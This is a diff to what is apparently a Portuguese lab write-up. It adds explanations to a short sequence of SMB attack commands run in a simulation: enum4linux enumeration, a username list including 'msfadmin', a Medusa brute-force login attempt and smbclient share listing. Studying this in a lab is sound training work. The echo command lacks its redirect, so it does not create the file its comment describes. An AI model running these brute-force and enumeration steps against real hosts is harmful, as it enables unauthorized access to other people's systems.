@@ -1,8 +1,13 @@
+Para a simulação foram executados alguns comandos como:
+
 enum4linux -a (IP) | tee enum4_output.txt
+- Coleta informações as guardando no arquivo "enum4_output.txt".
 
 echo -e 'user\nmsfadmin\nservice' smb_users.txt
+- Cria um arquivo chamado "smb_users.txt" com as informações "user\nmsfadmin\nservice".
 
 medusa -h (IP) -U smb_users.txt -M smbnt -t 2 -T 50
+- Tenta autenticar com base na lista de usuários criadas anteriormente no arquivo "smb_users.txt".
 
 smbclient -L //(IP) -U (USUARIO)
-
+- Testa o usuário encontrado na busca.
